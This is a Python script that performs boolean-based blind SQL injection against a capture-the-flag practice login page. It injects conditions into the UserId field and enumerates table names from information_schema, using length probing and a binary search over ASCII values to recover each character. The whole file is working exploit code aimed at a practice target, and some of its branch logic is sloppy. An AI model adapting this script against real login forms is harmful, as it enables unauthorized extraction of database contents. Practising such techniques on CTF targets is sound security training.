import requests

url = "http://ctf.segfaulthub.com:9999/sqli_3/login.php"

for c in range(0,100):
    SQL= f"select table_name from information_schema.tables where table_schema='sqli_3' limit {c},1"
    uid = f"normaltic' and (length(({SQL}))>0) and '1'='1"
    params = {
        "UserId": uid,
        "Password": "1234",
        "Submit": "Login"
    }
    response = requests.post(url, data=params)
    
    if 'Warning' in response.text:
        print('더이상 결과값이 없습니다.')
        break
    elif 'Warning' not in response.text:
        for t in range(1,100):
            uid = f"normaltic' and (length({SQL})={t}) and '1'='1"
            params = {
                "UserId": uid,
                "Password": "1234",
                "Submit": "Login"
            }
            response = requests.post(url, data=params)
            
            if 'Warning' not in response.text:
                t=t+1
                break


        for i in range(1,t):
            
            left, right = 33,126

            while left <= right:
                mid = (left + right) // 2

                uid = f"normaltic' and (ascii(substring(({SQL}),{i},1))>{mid}) and '1'='1"
                params = {
                    "UserId": uid,
                    "Password": "1234",
                    "Submit": "Login"
                }
                response = requests.post(url, data=params)

                if 'Warning' not in response.text:
                    left = mid +1
                    
                elif 'Warning' in response.text:               
                    right = mid -1
                    
                else:
                    print ("error")
                    break

            uid = f"normaltic' and (ascii(substring(({SQL}),{i},1))={mid}) and '1'='1"
            params = {
                "UserId": uid,
                "Password": "1234",
                "Submit": "Login"
            }
            response = requests.post(url, data=params)

            if 'Warning' not in response.text:
                print(chr(mid), end='')
            elif 'Warning' in response.text:
                uid = f"normaltic' and (ascii(substring(({SQL}),{i},1))={mid+1}) and '1'='1"
                params = {
                    "UserId": uid,
                    "Password": "1234",
                    "Submit": "Login"
                }
                response = requests.post(url, data=params)
                if 'Warning' not in response.text:
                    print(chr(mid+1), end='')
                elif 'Warning' not in response.text:
                    print(chr(mid-1), end='')

        print('')